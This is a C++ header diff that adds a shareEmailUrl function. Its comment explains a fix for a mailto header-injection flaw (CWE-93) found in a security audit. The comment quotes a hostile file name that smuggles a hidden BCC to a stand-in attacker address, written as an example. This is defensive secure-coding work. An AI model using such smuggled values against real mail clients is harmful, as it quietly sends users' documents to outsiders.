@@ -54,6 +54,17 @@ public:
     };
     static ExportPlan planForExport(const ExportPresetsPanel::Preset& p);
 
+    // M-2 (AUDIT-SECURITY-2026-09-25, CWE-93) test seam, same pure-function
+    // status as planForExport: composes the non-MAPI mailto share URL with
+    // BOTH interpolations percent-encoded (QUrl::toPercentEncoding). The
+    // filename/document metadata reaching `subject` is attacker-influenceable
+    // (a hostile document name like "q1 report&bcc=attacker@evil.example.pdf"
+    // or a CR/LF payload); unencoded interpolation let the mail client parse
+    // injected headers (hidden BCC exfiltration). Encoded, a hostile payload
+    // degrades to visible subject text. Never call QDesktopServices with an
+    // unencoded mailto built from document data.
+    static QString shareEmailUrl(const QString& subject, const QString& body);
+
 private:
     void onSave();
     void onSaveAs();
